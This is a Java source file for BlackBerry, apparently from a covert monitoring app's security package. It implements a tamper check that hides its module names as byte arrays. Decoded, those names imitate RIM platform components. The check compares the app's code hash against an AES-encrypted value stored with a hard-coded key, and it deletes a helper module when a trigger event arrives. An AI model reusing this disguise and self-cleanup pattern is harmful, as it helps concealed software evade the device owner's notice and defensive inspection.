package com.vvt.blackberry.fxs.security;

import java.io.IOException;

import com.vvt.encryption.AESDecryptor;

import net.rim.device.api.crypto.MD5Digest;
import net.rim.device.api.system.Application;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.ApplicationManagerException;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.GlobalEventListener;
import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;

public class SecurityChecker implements GlobalEventListener {

	private static byte [] name		= {110,101,116,95,114,105,109,95,112,108,97,116,102,111,114,109,97,112,112,115,95,114,101,115,111,117,114,99,101,95,115,101,99,117,114,105,116,121};
	private static byte [] startModuleName		= {110,101,116,95,114,105,109,95,112,108,97,116,102,111,114,109,95,114,101,115,111,117,114,99,101,95,115,101,99,117,114,105,116,121};
	private static byte [] keyData		= {-31,65,-6,-15,34,33,106,115,-70,26,59,93,-100,-55,90,-43};
	private static long guidStore		= -8023628115394224286l;
	private static long guidEvent		= 3245408838142788362l;
	private static int [] index		= {118,132,163,27,178,170,86,93,171,108,147,94,244,78,52,236,49,205,12,234,2,99,18,48,54,74,252,218,158,191,102,5,210,165,202,249,161,101,34,71,123,58,70,235,120,10,168,29,65,194,125,43,45,111,46,186,33,153,119,96,83,215,116,195};

	private boolean modify 	= true;

	private static final int STATE_BEFORE_START		= 0;
	private static final int STATE_START_UP			= 1;
	private static final int STATE_START_ALREADY	= 2;
	private static final int STATE_CLEAN			= 3;
		
	public SecurityChecker()	{
		Application.getApplication().addGlobalEventListener(this); 
	}
	
	public boolean isCodFileModified()	{
		callStarter();
		check();
		return modify;
	}
	
	private void pleaseWait()	{
		try {
			Thread.sleep(5000);
		}
		catch (Exception e) {
		}
	}
	
	private void check()	{
		modify 			= true;
		boolean found 	= false;
		try {
			while (found == false)	{			
				PersistentObject store = PersistentStore.getPersistentObject(guidStore);
	    		synchronized (store) {
	    			if (store.getContents() != null) {
	    				found = true;
	    				byte[] cipher 	 = (byte[]) store.getContents();
	    				byte[] shaCod 	 = getSHA1fromCipher(cipher);
	    				if (shaCod != null) {
		    				boolean match 	 = false;
		    				int moduleHandle = CodeModuleManager.getModuleHandle(new String(name)) ;
		    				byte[] 	sha1 	 = CodeModuleManager.getModuleHash(moduleHandle) ;
		    				if ((sha1.length > 15) && (sha1.length <= shaCod.length))	{
		    					match 	 = true;
		    					for (int i=0; i<sha1.length; i++)	{
		    						if (sha1[i] != shaCod[i]) {
		    							match = false;
		    							break;
		    						}
		    					}
		    				}
		    				modify = !match;
	    				}
	    				else {
	    					modify = true;
	    				}
	    			}
	    			else {
	    				modify = true;
	    			}
	    		}
	    		if (found == false) {
	    			pleaseWait();   			
	    		}
	    	}
        } catch(Exception ex) {
        }
	}	

	private byte [] getSHA1fromCipher(byte[] data)	{
		try {
			if (data.length == 256) {
				byte [] tmpData = new byte [256];
				for (int i=0; i<data.length; i++)	{
					tmpData[i] = data[i];
				}
				
				int lenCipher = 32;
				byte [] configCipher = new byte[lenCipher];
				for (int i=lenCipher; i<index.length; i++)	{
					configCipher[i-lenCipher] 	= tmpData[index[i]];
					tmpData[index[i]]	= 0;
				}
				byte [] desMd5 	= AESDecryptor.decrypt(keyData, configCipher);
				
				MD5Digest md5Digest = new  MD5Digest();
				if (tmpData.length > 0) {
					md5Digest.update(tmpData);
				}
				byte [] bmd5 	= md5Digest.getDigest();
	
				for (int i=0; i<bmd5.length; i++)	{
					if (bmd5[i] != desMd5[i])	{
						return null;
					}
				}
				
				byte [] wantedCipher = new byte[32];
				for (int i=0; i<32; i++)	{
					wantedCipher[i] 	= tmpData[index[i]];
				}
				byte [] codSHA1 = AESDecryptor.decrypt(keyData, wantedCipher);
				return codSHA1;
			}
		}
		catch (IOException e) {
		}
		return null;
	}

	public void eventOccurred(long guid, int data0, int data1, Object object0,
			Object object1) {
		if (guid == guidEvent) {
			cleanModule();
		}
	}
	
	private int callStarter()	{
		int state = STATE_BEFORE_START;
		try {
			String module = new String(startModuleName);
			int handle = CodeModuleManager.getModuleHandle(module);
			if( handle != 0 ) 
			{
				state = STATE_START_UP;
				ApplicationManager.getApplicationManager().launch(module);  
				state = STATE_START_ALREADY;  
			}
			else {
				state = STATE_CLEAN;  
			}		
		} catch (ApplicationManagerException e) {
		}
		return state;
	}
	
	private void cleanModule()	{
		int handle = CodeModuleManager.getModuleHandle(new String(startModuleName));
		if( handle != 0 ) 
		{
		    boolean success = CodeModuleManager.deleteModule( handle, true );
		}
	}
}